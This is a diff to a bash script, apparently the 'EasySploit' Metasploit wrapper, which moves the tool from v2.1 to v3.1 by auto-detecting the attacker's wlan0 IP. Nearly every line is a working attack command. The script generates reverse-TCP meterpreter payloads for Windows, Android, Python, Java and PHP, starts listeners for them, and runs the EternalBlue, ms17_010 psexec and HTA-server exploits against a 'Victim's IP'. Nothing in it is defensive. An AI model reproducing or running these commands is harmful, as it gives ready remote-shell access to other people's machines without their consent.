@@ -13,7 +13,7 @@ ip=$(ip addr show wlan0 | awk '/inet / {print $2}' | cut -d/ -f 1)
      ______                 _____       __      _ __ 
     / ____/___ ________  __/ ___/____  / /___  (_) /_
    / __/ / __ `/ ___/ / / /\__ \/ __ \/ / __ \/ / __/
-  / /___/ /_/ (__  ) /_/ /___/ / /_/ / / /_/ / / /_   v2.1
+  / /___/ /_/ (__  ) /_/ /___/ / /_/ / / /_/ / / /_   v3.1
  /_____/\__,_/____/\__, //____/ .___/_/\____/_/\__/  (Linux)
                   /____/     /_/                        \e[1;34m
                                 Created by "KALI LINUX TRICKS"
@@ -52,9 +52,7 @@ me='10'
 read x
 
 if [ "$x" == "$exe" ]; then                    #EXE
-echo 'Your IP ('$ip'):'
-read l
-msfvenom -p windows/meterpreter/reverse_tcp lhost=$l lport=4444 -f exe > /root/Desktop/test.exe
+msfvenom -p windows/meterpreter/reverse_tcp lhost=$ip lport=4444 -f exe > /root/Desktop/test.exe
 echo -e '
 
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
@@ -65,13 +63,11 @@ Waiting for listener...
  
 '
 
-msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $l ; set lport 4444 ; exploit ;"
+msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
 
 
 elif [ "$x" == "$apk" ]; then                          #APK
-echo 'Your IP ('$ip'):'
-read l
-msfvenom -p android/meterpreter/reverse_tcp lhost=$l lport=4444 > /root/Desktop/test.apk
+msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/test.apk
 echo -e '
 
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
@@ -82,15 +78,13 @@ Waiting for listener...
  
 '
 
-msfconsole -q -x " use exploit/multi/handler; set payload android/meterpreter/reverse_tcp;  set lhost $l ; set lport 4444 ; exploit ;"
+msfconsole -q -x " use exploit/multi/handler; set payload android/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
 
 
 
 
 elif [ "$x" == "$py" ]; then                       #PYTHON
-echo 'Your IP ('$ip'):'
-read l
-msfvenom -p python/meterpreter/reverse_tcp lhost=$l lport=4444 > /root/Desktop/test.py
+msfvenom -p python/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/test.py
 echo -e '
 
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
@@ -101,14 +95,12 @@ Waiting for listener...
  
 '
 
-msfconsole -q -x " use exploit/multi/handler; set payload python/meterpreter/reverse_tcp;  set lhost $l ; set lport 4444 ; exploit ;"
+msfconsole -q -x " use exploit/multi/handler; set payload python/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
 
 
 
 elif [ "$x" == "$jar" ]; then                        #JAVA
-echo 'Your IP ('$ip'):' 
-read l
-msfvenom -p java/meterpreter/reverse_tcp lhost=$l lport=4444 -f jar > /root/Desktop/test.jar
+msfvenom -p java/meterpreter/reverse_tcp lhost=$ip lport=4444 -f jar > /root/Desktop/test.jar
 echo -e '
 
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
@@ -119,7 +111,7 @@ Waiting for listener...
  
 '
 
-msfconsole -q -x " use exploit/multi/handler; set payload java/meterpreter/reverse_tcp;  set lhost $l ; set lport 4444 ; exploit ;"
+msfconsole -q -x " use exploit/multi/handler; set payload java/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
 
 
 
@@ -127,9 +119,7 @@ msfconsole -q -x " use exploit/multi/handler; set payload java/meterpreter/rever
 
 
 elif [ "$x" == "$php" ]; then                        #PHP
-echo 'Your IP ('$ip'):' 
-read l
-msfvenom -p php/meterpreter/reverse_tcp lhost=$l lport=4444 > /root/Desktop/test.php
+msfvenom -p php/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/test.php
 echo -e '
 
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
@@ -140,7 +130,7 @@ Waiting for listener...
  
 '
 
-msfconsole -q -x " use exploit/multi/handler; set payload php/meterpreter/reverse_tcp;  set lhost $l ; set lport 4444 ; exploit ;"
+msfconsole -q -x " use exploit/multi/handler; set payload php/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
 
 
 
@@ -157,12 +147,10 @@ read
 
 
 elif [ "$x" == "$eternalblue" ]; then                        #ETERNALBLUE
-echo 'Your IP ('$ip'):'
-read l
 echo "Victim's IP:"
 read r
 
-msfconsole -q -x " use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/meterpreter/reverse_tcp;  set lhost $l ; set rhost $r ; exploit ; "
+msfconsole -q -x " use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/meterpreter/reverse_tcp;  set lhost $ip ; set rhost $r ; exploit ; "
 exit
 
 
@@ -170,22 +158,18 @@ exit
 
 
 elif [ "$x" == "$psexec" ]; then                        #PSEXEC
-echo 'Your IP ('$ip'):'
-read l
 echo "Victim's IP:" 
 read r
 
-msfconsole -q -x " use exploit/windows/smb/ms17_010_psexec; set lhost $l ; set rhost $r ; exploit ;"
+msfconsole -q -x " use exploit/windows/smb/ms17_010_psexec; set lhost $ip ; set rhost $r ; exploit ;"
 
 
 
 
 elif [ "$x" == "$hta" ]; then                        #HTA
-echo 'Your IP ('$ip'):'
-read l
 echo 'Uripath: (/)'
 read u
-msfconsole -q -x " use exploit/windows/misc/hta_server; set srvhost $l; set uripath /$u; set payload windows/meterpreter/reverse_tcp; set lhost $l ; exploit ;"
+msfconsole -q -x " use exploit/windows/misc/hta_server; set srvhost $ip; set uripath /$u; set payload windows/meterpreter/reverse_tcp; set lhost $ip ; exploit ;"
 
 
 
@@ -198,7 +182,7 @@ echo -e '\e[1;33m
  #        ##   #"   " "m m"  #"   " #   "# #      m"  "m   #      #   
  #mmmmm  #  #  "#mmm   "#"   "#mmm  #mmm#" #      #    #   #      #   
  #       #mm#      "#   #        "# #      #      #    #   #      #   
- #mmmmm #    # "mmm#"   #    "mmm#" #      #mmmmm  #mm#  mm#mm    #  v2.1 \e[0m
+ #mmmmm #    # "mmm#"   #    "mmm#" #      #mmmmm  #mm#  mm#mm    #  v3.1 \e[0m
 
 
  \e[1;31m
